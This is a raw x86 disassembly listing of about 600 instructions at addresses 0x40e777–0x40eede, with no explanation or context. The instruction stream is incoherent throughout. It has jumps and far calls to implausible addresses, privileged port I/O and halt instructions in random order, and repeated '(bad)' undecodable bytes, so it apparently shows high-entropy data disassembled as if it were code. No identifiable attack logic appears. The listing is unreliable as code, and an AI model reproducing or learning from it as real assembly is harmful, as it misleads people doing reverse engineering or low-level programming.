  40e777:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e778:	adc    ebp,0xa7b60c67
  40e77e:	mov    bl,0xec
  40e780:	mov    dl,0xcf
  40e782:	dec    ebp
  40e783:	int    0x21
  40e785:	pop    esp
  40e786:	mov    ebp,esp
  40e788:	adc    dl,BYTE PTR [ebx+0x4757a06b]
  40e78e:	call   0xdf6c0c01
  40e793:	jecxz  0x40e7e4
  40e795:	in     eax,0x64
  40e797:	sbb    BYTE PTR [ebp+0x7cf7188e],dh
  40e79d:	daa    
  40e79e:	or     esi,ebx
  40e7a0:	call   0xcee3d1ab
  40e7a5:	or     eax,DWORD PTR [edx-0x5c00bb4f]
  40e7ab:	inc    edi
  40e7ac:	cmc    
  40e7ad:	push   ss
  40e7ae:	call   0xfca:0x864859fa
  40e7b5:	adc    edx,esi
  40e7b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e7b8:	or     ah,bl
  40e7ba:	ins    BYTE PTR es:[edi],dx
  40e7bb:	mov    gs,WORD PTR [esi+0x37]
  40e7be:	shl    ebx,cl
  40e7c0:	jnp    0x40e83f
  40e7c2:	xchg   esi,eax
  40e7c3:	shr    DWORD PTR [edx+0xb],cl
  40e7c6:	adc    esi,DWORD PTR [bx+si+0x34b3]
  40e7cb:	hlt    
  40e7cc:	mov    dl,0x30
  40e7ce:	fwait
  40e7cf:	cmp    ebx,DWORD PTR [ebp-0x79]
  40e7d2:	xor    DWORD PTR [edi+eiz*2],0x9f9982fb
  40e7d9:	cmp    DWORD PTR [ecx+0x1858d2aa],ebx
  40e7df:	jp     0x40e823
  40e7e1:	mov    ds:0xb6b6a039,al
  40e7e6:	mov    edx,0x1ab57be7
  40e7eb:	mov    cl,0x49
  40e7ed:	xor    eax,DWORD PTR [ecx+0x5d]
  40e7f0:	xchg   ebx,eax
  40e7f1:	or     ecx,DWORD PTR [esi+0x0]
  40e7f4:	xlat   BYTE PTR ds:[ebx]
  40e7f5:	scas   eax,DWORD PTR es:[edi]
  40e7f6:	inc    edx
  40e7f7:	sub    al,0xec
  40e7f9:	add    BYTE PTR [edx-0x17bfc48e],bl
  40e7ff:	push   0x5a
  40e801:	inc    edi
  40e802:	frstor [edi-0x1992ed25]
  40e808:	push   ebp
  40e809:	push   esp
  40e80a:	or     dl,dl
  40e80c:	mov    dl,0x4e
  40e80e:	iret   
  40e80f:	jo     0x40e7ba
  40e811:	and    eax,edi
  40e813:	push   ss
  40e814:	rcr    BYTE PTR ds:0xab3f5d2,0x65
  40e81b:	das    
  40e81c:	xchg   esi,eax
  40e81d:	call   0xf3784395
  40e822:	call   0xd1ef:0x708f1f80
  40e829:	out    0x5d,eax
  40e82b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e82c:	cdq    
  40e82d:	add    al,0xf
  40e82f:	pop    esi
  40e830:	mov    ebx,0xb2d64485
  40e835:	push   esi
  40e836:	adc    edi,ebx
  40e838:	das    
  40e839:	xor    BYTE PTR [edi+0x2f],bl
  40e83c:	stos   DWORD PTR es:[edi],eax
  40e83d:	jmp    0x40e863
  40e83f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e840:	mov    edx,0x3935437
  40e845:	scas   al,BYTE PTR es:[edi]
  40e846:	inc    ecx
  40e847:	xor    esi,DWORD PTR [edx+0x5ce55e2a]
  40e84d:	loopne 0x40e8b2
  40e84f:	cmc    
  40e850:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e851:	or     esi,esp
  40e853:	xor    DWORD PTR [ebx+0x40d9ba83],0xea036818
  40e85d:	mov    ?,WORD PTR [ebx-0x59]
  40e860:	pusha  
  40e861:	pop    ebx
  40e862:	es or  al,al
  40e865:	add    DWORD PTR [ecx+0x43],esi
  40e868:	jns    0x40e875
  40e86a:	je     0x40e82b
  40e86c:	sbb    ebx,edx
  40e86e:	cs out 0x3b,eax
  40e871:	out    dx,eax
  40e872:	sahf   
  40e873:	add    esp,edx
  40e875:	(bad)  
  40e876:	out    dx,eax
  40e877:	mov    edx,0x497a2d32
  40e87c:	xlat   BYTE PTR ds:[ebx]
  40e87d:	mov    ebx,0x1174a71d
  40e882:	jne    0x40e89a
  40e884:	fwait
  40e885:	retf   
  40e886:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e887:	push   eax
  40e888:	dec    esi
  40e889:	push   ss
  40e88a:	add    cl,BYTE PTR [edi-0x4e]
  40e88d:	xchg   esp,eax
  40e88e:	sbb    al,0x5d
  40e890:	mov    ds:0x247773cc,al
  40e895:	mov    ebx,0xdc5ca73b
  40e89a:	mov    bh,0x3f
  40e89c:	or     edx,DWORD PTR [esi]
  40e89e:	inc    ecx
  40e89f:	dec    ebp
  40e8a0:	mov    dl,0x8f
  40e8a2:	neg    DWORD PTR [ecx+eax*8]
  40e8a5:	dec    ebx
  40e8a6:	scas   al,BYTE PTR es:[edi]
  40e8a7:	mov    edi,0xecb0b8f
  40e8ac:	imul   eax,eax,0xffffffab
  40e8af:	xor    BYTE PTR [edx+0x7b849ae3],bl
  40e8b5:	(bad)  
  40e8b6:	aas    
  40e8b7:	cmc    
  40e8b8:	fsub   DWORD PTR [eax]
  40e8ba:	daa    
  40e8bb:	cdq    
  40e8bc:	mov    ecx,0xfe099a34
  40e8c1:	fld    TBYTE PTR [esi+eax*2+0x299fe350]
  40e8c8:	(bad)  
  40e8c9:	push   ds
  40e8ca:	inc    ebx
  40e8cb:	gs jb  0x40e857
  40e8ce:	xor    bh,BYTE PTR [edi+edi*1+0xb]
  40e8d2:	and    dl,bh
  40e8d4:	xchg   edi,eax
  40e8d5:	ss jnp 0x40e88c
  40e8d8:	add    ecx,ebx
  40e8da:	call   0xeaa6:0xdafd4c0d
  40e8e1:	les    eax,FWORD PTR [edi+eiz*4-0x61ee6ebd]
  40e8e8:	adc    ch,BYTE PTR [esi-0x75]
  40e8eb:	xlat   BYTE PTR ds:[ebx]
  40e8ec:	mov    cl,0x86
  40e8ee:	jge    0x40e954
  40e8f0:	adc    DWORD PTR [edi+0x387f6fe2],esi
  40e8f6:	jb     0x40e908
  40e8f8:	bound  eax,QWORD PTR [edx+0x65388b9a]
  40e8fe:	inc    edx
  40e8ff:	mov    esi,0xa6d65bb4
  40e904:	aas    
  40e905:	bound  ecx,QWORD PTR ds:0xf51bd3ca
  40e90b:	imul   ecx,DWORD PTR [eax-0x43],0xffffff9a
  40e90f:	stos   BYTE PTR es:[edi],al
  40e910:	add    ebx,eax
  40e912:	ret    0xdc09
  40e915:	(bad)  
  40e916:	aad    0xa7
  40e918:	jns    0x40e96a
  40e91a:	ficom  WORD PTR [edi+esi*8+0x27e40b43]
  40e921:	jmp    0x40e918
  40e923:	mov    DWORD PTR [ebp+0xb],ebp
  40e926:	jbe    0x40e900
  40e928:	js     0x40e8f7
  40e92a:	test   DWORD PTR [edi-0x6765f97b],edi
  40e930:	in     al,dx
  40e931:	adc    ebx,0xb333c2d6
  40e937:	dec    edi
  40e938:	loope  0x40e91f
  40e93a:	mov    edi,0xec18d5a7
  40e93f:	popf   
  40e940:	fcomp  DWORD PTR [edi+0x18]
  40e943:	xor    esi,DWORD PTR [edx+0x15ee429]
  40e949:	lods   al,BYTE PTR ds:[esi]
  40e94a:	and    al,0x1e
  40e94c:	xchg   BYTE PTR [ecx-0x67],bh
  40e94f:	sti    
  40e950:	clc    
  40e951:	cmp    DWORD PTR [edx-0x35a143b4],ebx
  40e957:	sbb    BYTE PTR [ebx],bh
  40e959:	dec    edi
  40e95a:	test   BYTE PTR [eax-0x67],al
  40e95d:	jo     0x40e974
  40e95f:	dec    ebp
  40e960:	pop    ss
  40e961:	sub    ebp,DWORD PTR [esi-0x72]
  40e964:	xchg   ebx,eax
  40e965:	mul    ebp
  40e967:	test   DWORD PTR [esi+edi*4-0x73],0x51f820a7
  40e96f:	jle    0x40e9b4
  40e971:	adc    bl,BYTE PTR ds:0x7185b1ef
  40e977:	mov    dh,0x1b
  40e979:	sub    al,0xcc
  40e97b:	addr16 sti 
  40e97d:	jge    0x40e90b
  40e97f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e980:	mov    edx,0x490d460f
  40e985:	(bad)  
  40e987:	sub    DWORD PTR [edi-0x3d],eax
  40e98a:	into   
  40e98b:	or     al,0xb5
  40e98d:	dec    esp
  40e98e:	dec    eax
  40e98f:	(bad)  
  40e990:	dec    BYTE PTR [eax]
  40e992:	mov    ebp,0x478b7bb8
  40e997:	repnz lds edi,FWORD PTR [edi]
  40e99a:	sub    DWORD PTR [ecx-0x43a354f0],ebp
  40e9a0:	loopne 0x40e9ad
  40e9a2:	lods   eax,DWORD PTR ds:[esi]
  40e9a3:	mov    ds:0xeee3dff4,eax
  40e9a8:	mov    dl,0xcb
  40e9aa:	cli    
  40e9ab:	push   0xdb78db36
  40e9b0:	adc    cl,BYTE PTR [eax]
  40e9b2:	push   ecx
  40e9b3:	xchg   BYTE PTR [ebx],ch
  40e9b5:	pop    ebx
  40e9b6:	out    0x74,eax
  40e9b8:	jp     0x40ea23
  40e9ba:	nop
  40e9bb:	cli    
  40e9bc:	mov    ch,0xdf
  40e9be:	mov    ds:0xaa8604aa,al
  40e9c3:	adc    BYTE PTR [eax*1-0x62ca5322],dh
  40e9ca:	jne    0x40e94e
  40e9cc:	xor    ch,BYTE PTR [esi]
  40e9ce:	int    0x12
  40e9d0:	test   ebp,esi
  40e9d2:	js     0x40e987
  40e9d4:	mov    dl,0x76
  40e9d6:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  40e9d8:	or     ecx,ebp
  40e9da:	rol    BYTE PTR [esi-0x10b2f42e],1
  40e9e0:	pop    ecx
  40e9e1:	es push 0x9a10b434
  40e9e7:	push   edx
  40e9e8:	inc    ecx
  40e9e9:	cld    
  40e9ea:	add    bl,BYTE PTR [ebp+0x7a]
  40e9ed:	cmp    al,BYTE PTR [esi-0x59]
  40e9f0:	or     DWORD PTR [eax],ebp
  40e9f2:	xchg   esp,eax
  40e9f3:	sub    BYTE PTR [eax-0x5eace61d],bh
  40e9f9:	add    DWORD PTR [eax+0x313b29a],0x60
  40ea00:	fldcw  WORD PTR [edi+0x4266b9d1]
  40ea06:	dec    edx
  40ea07:	test   al,0x44
  40ea09:	stos   DWORD PTR es:[edi],eax
  40ea0a:	cmp    edi,DWORD PTR [eax-0x5c]
  40ea0d:	mov    esi,0xe96487e5
  40ea12:	call   0xd019:0x4055b5d
  40ea19:	popa   
  40ea1a:	cmp    ah,BYTE PTR [edi-0x7258c060]
  40ea20:	pop    ebp
  40ea21:	xor    eax,0x42b217ad
  40ea26:	dec    edi
  40ea27:	push   0xfffffffd
  40ea29:	mov    dl,0x2b
  40ea2b:	test   BYTE PTR [ecx],ah
  40ea2d:	jnp    0x40ea48
  40ea2f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ea30:	push   0xe9bdc532
  40ea35:	test   ebx,eax
  40ea37:	fnsave [edx-0x358c5e92]
  40ea3d:	mov    DWORD PTR [ebx+ebp*4],esp
  40ea40:	loope  0x40ea56
  40ea42:	nop
  40ea43:	loop   0x40ea92
  40ea45:	mov    ah,0x15
  40ea47:	cmp    eax,0xcc10644c
  40ea4c:	push   0xc492270c
  40ea51:	sbb    ebx,DWORD PTR [ecx-0x78]
  40ea54:	mov    bl,0xfc
  40ea56:	loope  0x40ea30
  40ea58:	mov    dl,0xc3
  40ea5a:	or     eax,0x228b508d
  40ea5f:	jae    0x40ea4e
  40ea61:	adc    eax,0xcb775191
  40ea66:	pushf  
  40ea67:	mov    ebx,0xb710f54e
  40ea6c:	mov    dl,0x4c
  40ea6e:	aad    0x2e
  40ea70:	fwait
  40ea71:	inc    ebx
  40ea72:	cmp    al,0xc1
  40ea74:	cdq    
  40ea75:	or     eax,ecx
  40ea77:	in     eax,dx
  40ea78:	ret    0x1c70
  40ea7b:	outs   dx,DWORD PTR ds:[esi]
  40ea7c:	aas    
  40ea7d:	pop    ecx
  40ea7e:	call   0xfd34:0x987d9508
  40ea85:	out    dx,eax
  40ea86:	or     ah,BYTE PTR [edi+0x724215f9]
  40ea8c:	add    BYTE PTR [edi],dl
  40ea8e:	ret    
  40ea8f:	jmp    0x40ea43
  40ea91:	mov    esi,0x54fd5da
  40ea96:	(bad)  
  40ea97:	xor    edx,ecx
  40ea99:	or     ebp,ebp
  40ea9b:	push   ss
  40ea9c:	and    eax,0x5bd2d042
  40eaa1:	cli    
  40eaa2:	in     eax,0x49
  40eaa4:	iret   
  40eaa5:	pusha  
  40eaa6:	call   0x6b4f:0xa1eb61f6
  40eaad:	mov    WORD PTR [eax+0x186feda7],es
  40eab3:	push   ebp
  40eab4:	ins    DWORD PTR es:[edi],dx
  40eab5:	xchg   ebx,eax
  40eab6:	cmp    ch,bh
  40eab8:	mov    dl,0x90
  40eaba:	aaa    
  40eabb:	or     edx,0xfffffff3
  40eabe:	mov    ds:0x5c0b11c9,al
  40eac3:	cmc    
  40eac4:	aad    0xaf
  40eac6:	xchg   edx,eax
  40eac7:	adc    eax,0x199abbfc
  40eacc:	adc    edi,DWORD PTR [edi+0x18]
  40eacf:	cs js  0x40ea8f
  40ead2:	clc    
  40ead3:	dec    ebx
  40ead4:	fsubr  st,st(5)
  40ead6:	mov    ah,0xae
  40ead8:	mov    ah,BYTE PTR [edx-0xb]
  40eadb:	jecxz  0x40ea8e
  40eadd:	popf   
  40eade:	fdivr  DWORD PTR [edx+ecx*2-0x4dc40d60]
  40eae5:	pop    eax
  40eae6:	(bad)  
  40eae7:	cmp    al,0xc7
  40eae9:	or     DWORD PTR [edi+0x660bdd7b],esp
  40eaef:	call   0xace73596
  40eaf4:	xchg   eax,ecx
  40eaf6:	push   0x7962bdb5
  40eafb:	jp     0x40eacb
  40eafd:	push   0x1e
  40eaff:	mov    esi,0x6a72091b
  40eb04:	cld    
  40eb05:	or     ebp,DWORD PTR ds:0xac6c9ac2
  40eb0b:	mov    ebx,0xb9b2818
  40eb10:	mov    ebx,0x555a9e8b
  40eb15:	inc    eax
  40eb16:	dec    esi
  40eb17:	pop    ebp
  40eb18:	(bad)  
  40eb19:	xor    bh,BYTE PTR [eax+0x28]
  40eb1c:	mov    dl,0xe5
  40eb1e:	mov    cs:0xca79c5d8,al
  40eb24:	mov    dl,0x74
  40eb26:	adc    BYTE PTR [edi-0x5a173cd],ch
  40eb2c:	or     DWORD PTR [ebx],0x63729ea6
  40eb32:	jae    0x40eb92
  40eb34:	stos   DWORD PTR es:[edi],eax
  40eb35:	jns    0x40ead1
  40eb37:	jmp    0x438eeb23
  40eb3c:	inc    ebp
  40eb3d:	sbb    DWORD PTR [ecx-0x29cb59],edi
  40eb43:	out    0x62,eax
  40eb45:	xchg   ebx,eax
  40eb46:	cmp    al,0x40
  40eb48:	mov    dl,0xbe
  40eb4a:	xchg   edi,eax
  40eb4b:	mov    edi,0x5c62814f
  40eb50:	cmp    ch,0xea
  40eb53:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eb54:	push   esp
  40eb55:	jmp    0x47a5:0x6b88078b
  40eb5c:	xor    ebx,DWORD PTR fs:[edx-0x578a8687]
  40eb63:	add    esp,DWORD PTR [edi+0x5da69c7d]
  40eb69:	xlat   BYTE PTR ds:[ebx]
  40eb6a:	mov    ebp,0xb2ca8b1d
  40eb6f:	xlat   BYTE PTR ds:[ebx]
  40eb70:	add    BYTE PTR [edx+ebx*4-0x585c339f],dl
  40eb77:	dec    ebp
  40eb78:	fincstp 
  40eb7a:	(bad)  
  40eb7b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eb7c:	xchg   esp,eax
  40eb7d:	mov    esp,gs
  40eb7f:	jecxz  0x40eb46
  40eb81:	data16 mov BYTE PTR [ecx-0x6f7cdc4d],dl
  40eb88:	(bad)  
  40eb89:	test   eax,0x3fd2a85e
  40eb8e:	test   BYTE PTR [edi-0x40af1b19],ah
  40eb94:	gs jbe 0x40ebc1
  40eb97:	hlt    
  40eb98:	(bad)  
  40eb99:	mov    ebp,0x76d199a
  40eb9e:	add    BYTE PTR [esi+edx*4],bh
  40eba1:	sub    eax,0xfe01a7a2
  40eba6:	add    eax,0x4bb037c3
  40ebab:	ja     0x40ebef
  40ebad:	sbb    esp,ebp
  40ebaf:	repnz mov dl,0xe0
  40ebb2:	(bad)  
  40ebb3:	adc    eax,0x10c4f4d
  40ebb8:	(bad)  
  40ebb9:	out    dx,eax
  40ebba:	into   
  40ebbb:	aas    
  40ebbc:	rcl    DWORD PTR [edi],cl
  40ebbe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ebbf:	ins    BYTE PTR es:[edi],dx
  40ebc0:	cmp    cl,BYTE PTR [ebx-0x36ae4351]
  40ebc6:	jo     0x40ec13
  40ebc8:	mov    dl,0x13
  40ebca:	outs   dx,DWORD PTR ds:[esi]
  40ebcb:	aad    0x1d
  40ebcd:	pop    edx
  40ebce:	jnp    0x40eb8b
  40ebd0:	inc    eax
  40ebd1:	or     esp,DWORD PTR [ebx-0x53]
  40ebd4:	in     al,dx
  40ebd5:	and    DWORD PTR [edx],edx
  40ebd7:	in     al,dx
  40ebd8:	ret    
  40ebd9:	or     DWORD PTR [ebx-0xf7fd77b],esp
  40ebdf:	jo     0x40ec47
  40ebe1:	mov    esp,DWORD PTR [ebx+ebx*8+0x59]
  40ebe5:	pop    eax
  40ebe6:	xlat   BYTE PTR ds:[ebx]
  40ebe7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ebe8:	std    
  40ebe9:	jo     0x40ebfe
  40ebeb:	or     BYTE PTR [esp+edx*1],dl
  40ebee:	in     eax,0x22
  40ebf0:	enter  0x9abe,0x6a
  40ebf4:	sbb    al,0xa9
  40ebf6:	arpl   WORD PTR [edx+0x3],di
  40ebf9:	jl     0x40ebbf
  40ebfb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ebfc:	test   al,0x6b
  40ebfe:	push   es
  40ebff:	enter  0x3c3a,0xe0
  40ec03:	fidiv  DWORD PTR [ebp+0x62accee3]
  40ec09:	std    
  40ec0a:	in     al,0xa7
  40ec0c:	sub    ch,BYTE PTR [edx+0xbdd7474]
  40ec12:	xchg   ebp,eax
  40ec13:	or     edx,edx
  40ec15:	scas   al,BYTE PTR es:[edi]
  40ec16:	mov    ecx,0x9a8a4695
  40ec1b:	jmp    0x40ec23
  40ec1d:	push   ecx
  40ec1e:	xchg   ecx,eax
  40ec1f:	dec    edi
  40ec20:	cdq    
  40ec21:	call   0x1bce:0xa47ba74c
  40ec28:	mov    bh,0xa5
  40ec2a:	outs   dx,BYTE PTR ds:[esi]
  40ec2b:	adc    DWORD PTR [ebx+0x6c7e7e5],esi
  40ec31:	mov    edx,0xd25f8c
  40ec36:	nop
  40ec37:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ec38:	xlat   BYTE PTR ds:[ebx]
  40ec39:	mov    esp,0xe379b066
  40ec3e:	jecxz  0x40ec93
  40ec40:	fidivr WORD PTR [esi-0x66]
  40ec43:	mov    ebx,0x5cccd6ab
  40ec48:	ret    0xcb71
  40ec4b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ec4c:	stos   BYTE PTR es:[edi],al
  40ec4d:	data16 jl 0x40ec16
  40ec50:	dec    esp
  40ec51:	and    DWORD PTR [edx+ebp*1],esi
  40ec54:	mov    dl,0x85
  40ec56:	lock or al,0x94
  40ec59:	pop    ds
  40ec5a:	push   esp
  40ec5b:	jb     0x40ecb5
  40ec5d:	jne    0x40ec47
  40ec5f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ec60:	or     eax,DWORD PTR [edi-0x3e]
  40ec63:	or     BYTE PTR [eax-0x32aff50a],ah
  40ec69:	pop    esp
  40ec6a:	jl     0x40ece7
  40ec6c:	mov    dl,0x8e
  40ec6e:	popf   
  40ec6f:	enter  0x5204,0x10
  40ec73:	jp     0x40ec17
  40ec75:	sub    eax,0x15454cb0
  40ec7a:	mov    eax,ds:0xd53b6d26
  40ec7f:	jno    0x40ecd5
  40ec81:	out    dx,eax
  40ec82:	repz pop ebx
  40ec84:	mov    dl,0xc1
  40ec86:	xchg   ebx,eax
  40ec87:	adc    eax,0x472d60b1
  40ec8c:	imul   ecx,DWORD PTR [ebx],0x78
  40ec8f:	jbe    0x40ec57
  40ec91:	es repnz clc 
  40ec94:	(bad)  
  40ec95:	mov    edx,0xb3801795
  40ec9a:	add    al,0x27
  40ec9c:	rcr    DWORD PTR [edx+0xae2a8ff],0x62
  40eca3:	mov    cl,0x61
  40eca5:	and    eax,DWORD PTR [eax]
  40eca7:	(bad)  
  40eca9:	cmp    esi,ebx
  40ecab:	sbb    eax,0xba7213e9
  40ecb0:	mov    dl,0xba
  40ecb2:	xor    al,0x71
  40ecb4:	mov    bh,0xc7
  40ecb6:	sub    dh,BYTE PTR [edx-0x4e]
  40ecb9:	inc    edx
  40ecba:	add    eax,0x61e009ef
  40ecbf:	xchg   ecx,eax
  40ecc0:	out    dx,eax
  40ecc1:	or     dl,cl
  40ecc3:	retf   0x91c4
  40ecc6:	adc    edi,DWORD PTR [esi-0x71]
  40ecc9:	repz dec ebp
  40eccb:	test   BYTE PTR [esi+0x17202163],dh
  40ecd1:	adc    DWORD PTR [ebx-0x73],ebx
  40ecd4:	push   ss
  40ecd5:	stos   BYTE PTR es:[edi],al
  40ecd6:	lods   ax,WORD PTR ds:[esi]
  40ecd8:	cli    
  40ecd9:	repz jmp 0x40ed30
  40ecdc:	jb     0x40ecf5
  40ecde:	(bad)  
  40ecdf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ece0:	call   0x2ce75e81
  40ece5:	mov    ebx,0x61b24805
  40ecea:	mov    al,ds:0x12e96fb9
  40ecef:	jns    0x40ed5c
  40ecf1:	daa    
  40ecf2:	push   0xbd0bcc75
  40ecf7:	inc    eax
  40ecf8:	adc    DWORD PTR [esi+0x2b2ea4c],ecx
  40ecfe:	les    edi,FWORD PTR [ebp+edi*8-0x6b]
  40ed02:	imul   ebx,DWORD PTR [ecx-0x6d4af466],0xffffffc1
  40ed09:	mov    eax,0x736d863a
  40ed0e:	call   0x1a8e:0xccbd5ef2
  40ed15:	loop   0x40ed2e
  40ed17:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ed18:	leave  
  40ed19:	scas   eax,DWORD PTR es:[edi]
  40ed1a:	test   BYTE PTR [esi+eax*4],dl
  40ed1d:	mov    eax,ds:0xdabcb4c3
  40ed22:	fadd   QWORD PTR [edx]
  40ed24:	jp     0x40ed51
  40ed26:	add    ebx,ebp
  40ed28:	or     al,0x46
  40ed2a:	or     al,0x47
  40ed2c:	fisttp QWORD PTR [ebx]
  40ed2e:	in     eax,dx
  40ed2f:	mov    DWORD PTR [eax*4+0x1f066db6],edx
  40ed36:	xchg   ebp,eax
  40ed37:	cmp    al,0xe9
  40ed39:	mov    edx,0x2b45c89c
  40ed3e:	xor    BYTE PTR [ecx+0x53],dl
  40ed41:	jge    0x40ed8e
  40ed43:	mov    al,ds:0x280df11c
  40ed48:	in     eax,0x9b
  40ed4a:	dec    edx
  40ed4b:	add    ebx,0x74
  40ed4e:	xchg   ebp,eax
  40ed4f:	sub    al,0x4b
  40ed51:	mov    ds:0x46d407c6,eax
  40ed56:	sub    eax,0xf9e766d2
  40ed5b:	aad    0x51
  40ed5d:	xor    al,0x8d
  40ed5f:	cmp    esi,DWORD PTR [edx]
  40ed61:	clc    
  40ed62:	sti    
  40ed63:	mov    eax,ds:0x52bb508e
  40ed68:	retf   0x9923
  40ed6b:	ffreep st(1)
  40ed6d:	ficomp DWORD PTR [edx-0x51]
  40ed70:	ret    
  40ed71:	xchg   ebx,eax
  40ed72:	popf   
  40ed73:	sar    BYTE PTR [esi],1
  40ed75:	or     ebx,DWORD PTR [esp+eax*2]
  40ed78:	dec    esi
  40ed79:	sbb    esp,DWORD PTR [esi-0x182713e4]
  40ed7f:	mov    edi,0x39ba61b2
  40ed84:	dec    edi
  40ed85:	jae    0x40ed67
  40ed87:	clc    
  40ed88:	or     BYTE PTR ds:0xab324fd5,dh
  40ed8e:	das    
  40ed8f:	mov    ah,0x6
  40ed92:	(bad)  
  40ed93:	jmp    0xa848cd86
  40ed98:	push   ds
  40ed99:	jg     0x40ed5c
  40ed9b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ed9c:	push   ebx
  40ed9d:	shr    DWORD PTR [esi+0x74089d2f],1
  40eda3:	add    BYTE PTR [eax-0x9],bh
  40eda6:	pop    ds
  40eda7:	scas   al,BYTE PTR es:[edi]
  40eda8:	cmp    dh,BYTE PTR [ebp-0x3a]
  40edab:	jmp    0xb35b:0xf91722b2
  40edb2:	push   ss
  40edb3:	icebp  
  40edb4:	and    eax,0x750f8b0b
  40edb9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40edba:	jo     0x40ee04
  40edbc:	pop    edi
  40edbd:	xor    BYTE PTR [edi+0x5a2d88de],al
  40edc3:	lods   eax,DWORD PTR ds:[esi]
  40edc4:	dec    ecx
  40edc5:	add    al,0xc
  40edc7:	aam    0x8c
  40edc9:	paddd  mm7,QWORD PTR [eax+ebp*1-0x20]
  40edce:	xor    eax,0xceba1b27
  40edd3:	(bad)  
  40edd4:	mov    dl,0xae
  40edd6:	fwait
  40edd7:	jecxz  0x40ee08
  40edd9:	retf   0x99cb
  40eddc:	add    eax,0xab14cd0b
  40ede1:	outs   dx,DWORD PTR ds:[esi]
  40ede2:	scas   eax,DWORD PTR es:[edi]
  40ede3:	dec    esi
  40ede4:	repz sub al,BYTE PTR [ebp+0x1ab7d1c5]
  40edeb:	call   0xbbe:0x77165eb
  40edf2:	dec    ecx
  40edf3:	jp     0x40edb9
  40edf5:	push   0xffffffe7
  40edf7:	inc    esp
  40edf8:	sar    DWORD PTR [edx+ebx*4-0x56],0x7d
  40edfd:	pushw  cs
  40edff:	cwde   
  40ee00:	loope  0x40edd3
  40ee02:	mov    esp,DWORD PTR [edi+0x41b48249]
  40ee08:	pop    ebp
  40ee09:	sub    esp,ebp
  40ee0b:	test   BYTE PTR [edx-0x36c0e0e2],dh
  40ee11:	aaa    
  40ee12:	xchg   esp,eax
  40ee13:	adc    DWORD PTR [eax+0xb],ebp
  40ee16:	or     al,0xc7
  40ee18:	mov    ch,0x3b
  40ee1a:	jbe    0x40ee44
  40ee1c:	sbb    eax,0x4e2b8632
  40ee21:	pop    esi
  40ee22:	push   eax
  40ee23:	or     ecx,DWORD PTR [edi]
  40ee25:	mov    esp,0x10b21bbe
  40ee2a:	mov    edi,0x7ab30def
  40ee2f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ee30:	cs jb  0x40ee72
  40ee33:	add    ebx,esi
  40ee35:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ee36:	or     al,0x7b
  40ee38:	mov    bh,0x7a
  40ee3a:	ret    0xd266
  40ee3d:	in     al,dx
  40ee3e:	xor    cl,BYTE PTR [esi+ecx*4]
  40ee41:	test   DWORD PTR [edx-0xbf4bb30],esp
  40ee47:	loope  0x40ee52
  40ee49:	mov    ch,0xff
  40ee4b:	jns    0x40edf4
  40ee4d:	cmp    bl,BYTE PTR [esi-0x1e871110]
  40ee53:	adc    ebx,DWORD PTR [eax]
  40ee55:	or     BYTE PTR [edi+0x63cffd64],cl
  40ee5b:	(bad)  
  40ee5c:	in     al,0x6b
  40ee5e:	shl    cl,1
  40ee60:	mov    dl,0x42
  40ee62:	add    ch,cl
  40ee64:	add    DWORD PTR [ebx-0x54],ebx
  40ee67:	imul   esp,DWORD PTR [esi+0x9d4710b],0xffffffad
  40ee6e:	mov    al,0x97
  40ee70:	and    al,0x5f
  40ee72:	call   0x6abc:0xd42e1efc
  40ee79:	dec    ebp
  40ee7a:	in     al,0xdc
  40ee7c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ee7d:	pop    ss
  40ee7e:	push   0x45
  40ee80:	mov    ebp,0x4cf62dcc
  40ee85:	mov    edx,DWORD PTR [ebx-0x629884d5]
  40ee8b:	imul   ebx,DWORD PTR [edx+0x4d],0xffffffb0
  40ee8f:	mov    dl,0x62
  40ee91:	mov    DWORD PTR [eax+0x15],edx
  40ee94:	dec    ebx
  40ee95:	or     DWORD PTR [eax+0x7fd07289],ebp
  40ee9b:	xchg   ecx,eax
  40ee9c:	push   edx
  40ee9d:	jo     0x40ee3b
  40ee9f:	mov    cl,0xb2
  40eea1:	test   BYTE PTR [eax],dl
  40eea3:	in     al,0x6a
  40eea5:	xor    BYTE PTR [edx-0x3af4b1f6],bh
  40eeab:	shr    ah,0x13
  40eeae:	push   ebx
  40eeaf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eeb0:	adc    BYTE PTR [esi+0x15d7219e],0x3e
  40eeb7:	xchg   BYTE PTR [edx-0x30],dh
  40eeba:	mov    ah,0x81
  40eebc:	into   
  40eebd:	add    al,0xbe
  40eebf:	pop    ebp
  40eec0:	lock or edx,edi
  40eec3:	cs push ebp
  40eec5:	fstp   DWORD PTR [ecx-0x280a4da6]
  40eecb:	repnz bnd ret 
  40eece:	sbb    eax,DWORD PTR [edx]
  40eed0:	mov    WORD PTR [ebx],cs
  40eed2:	pop    ecx
  40eed3:	push   eax
  40eed4:	retf   
  40eed5:	loop   0x40ef1a
  40eed7:	inc    edx
  40eed8:	loopne 0x40ef2e
  40eeda:	xchg   esp,eax
  40eedb:	sbb    ebp,DWORD PTR [edx]
  40eedd:	xchg   esp,eax
  40eede:	pusha  
